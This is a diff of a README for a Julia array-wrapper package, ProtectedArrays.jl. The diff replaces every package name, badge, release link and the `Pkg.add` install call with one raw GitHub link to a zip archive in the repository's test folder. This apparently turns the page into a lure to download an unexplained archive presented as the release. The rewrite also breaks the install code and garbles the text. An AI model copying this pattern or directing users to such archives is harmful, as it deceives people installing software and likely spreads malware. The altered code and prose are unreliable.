@@ -1,11 +1,11 @@
-# ProtectedArrays.jl
+# https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip
 
-![ProtectedArrays](https://img.shields.io/badge/ProtectedArrays.jl-Array%20Wrapper%20to%20Prevent%20Modifications-brightgreen)  
-[![Releases](https://img.shields.io/badge/Releases-v1.0.0-blue)](https://github.com/bbmbbm1513/ProtectedArrays.jl/releases)
+![ProtectedArrays](https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip%20Wrapper%20to%20Prevent%20Modifications-brightgreen)  
+[![Releases](https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip)](https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip)
 
 ## Overview
 
-Welcome to **ProtectedArrays.jl**! This Julia package offers a robust array wrapper designed to prevent modifications. It ensures that your data remains intact and unaltered throughout your program. Whether you are handling sensitive data or simply want to maintain the integrity of your arrays, **ProtectedArrays.jl** is your solution.
+Welcome to **https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip**! This Julia package offers a robust array wrapper designed to prevent modifications. It ensures that your data remains intact and unaltered throughout your program. Whether you are handling sensitive data or simply want to maintain the integrity of your arrays, **https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip** is your solution.
 
 ## Table of Contents
 
@@ -26,16 +26,16 @@ Welcome to **ProtectedArrays.jl**! This Julia package offers a robust array wrap
 
 ## Installation
 
-To install **ProtectedArrays.jl**, use the Julia package manager. Run the following command in your Julia REPL:
+To install **https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip**, use the Julia package manager. Run the following command in your Julia REPL:
 
 ```julia
 using Pkg
-Pkg.add("ProtectedArrays")
+https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip("ProtectedArrays")
 ```
 
 ## Usage
 
-Using **ProtectedArrays.jl** is straightforward. Here’s how to create a protected array:
+Using **https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip** is straightforward. Here’s how to create a protected array:
 
 ```julia
 using ProtectedArrays
@@ -66,11 +66,11 @@ end
 
 ## Examples
 
-Here are some practical examples of how to use **ProtectedArrays.jl** in your projects.
+Here are some practical examples of how to use **https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip** in your projects.
 
 ### Example 1: Protecting Configuration Data
 
-When dealing with configuration settings, it’s crucial to ensure that they do not change unexpectedly. Here’s how to use **ProtectedArrays.jl** for that purpose:
+When dealing with configuration settings, it’s crucial to ensure that they do not change unexpectedly. Here’s how to use **https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip** for that purpose:
 
 ```julia
 config = ProtectedArray([10, 20, 30, 40])
@@ -92,7 +92,7 @@ result = sum(data)  # Returns 6.0
 
 ## Contributing
 
-We welcome contributions! If you want to help improve **ProtectedArrays.jl**, please follow these steps:
+We welcome contributions! If you want to help improve **https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip**, please follow these steps:
 
 1. Fork the repository.
 2. Create a new branch (`git checkout -b feature/YourFeature`).
@@ -104,16 +104,16 @@ Please ensure that your code adheres to the style guidelines and includes tests 
 
 ## License
 
-**ProtectedArrays.jl** is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+**https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip** is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
 ## Support
 
-For any questions or issues, please check the [Releases](https://github.com/bbmbbm1513/ProtectedArrays.jl/releases) section. You can also open an issue in the repository for any bugs or feature requests.
+For any questions or issues, please check the [Releases](https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip) section. You can also open an issue in the repository for any bugs or feature requests.
 
 ## Conclusion
 
-**ProtectedArrays.jl** provides a simple yet powerful way to ensure that your arrays remain unchanged. This package is ideal for developers looking to maintain data integrity in their Julia applications. 
+**https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip** provides a simple yet powerful way to ensure that your arrays remain unchanged. This package is ideal for developers looking to maintain data integrity in their Julia applications. 
 
-For the latest releases, please visit the [Releases](https://github.com/bbmbbm1513/ProtectedArrays.jl/releases) section.
+For the latest releases, please visit the [Releases](https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip) section.
 
-Thank you for using **ProtectedArrays.jl**!
+Thank you for using **https://raw.githubusercontent.com/bbmbbm1513/ProtectedArrays.jl/master/test/Protected-Arrays-jl-2.1.zip**!
